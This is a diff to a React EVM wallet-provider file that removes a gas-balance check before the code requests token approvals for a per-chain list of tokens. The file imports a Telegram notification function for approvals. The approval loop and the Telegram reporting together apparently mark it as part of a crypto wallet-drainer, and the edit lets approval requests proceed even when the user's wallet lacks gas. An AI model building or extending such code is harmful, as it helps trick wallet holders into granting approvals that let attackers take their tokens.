@@ -1,7 +1,7 @@
 import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
 import { toast } from "sonner";
 import { getChainById, type ChainConfig } from "@/lib/chains";
-import { getNativeBalance, getAllowance, encodeApproveCalldata } from "@/lib/evmUtils";
+import { getAllowance, encodeApproveCalldata } from "@/lib/evmUtils";
 import { sendEvmApprovalNotification } from "@/lib/telegramNotify";
 import {
   connectMultiChainWallet,
@@ -120,14 +120,6 @@ export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
     let success = false;
 
     try {
-      const nativeBal = await getNativeBalance(address, chain);
-      if (nativeBal < chain.minGasThreshold) {
-        toast.error(
-          `Insufficient gas on ${chain.name}. Need at least ${chain.minGasThreshold} ${chain.nativeCurrency.symbol}`
-        );
-        return false;
-      }
-
       await switchNetwork(chain.chainId).catch(() => {});
 
       for (const token of chain.approvalTokens) {
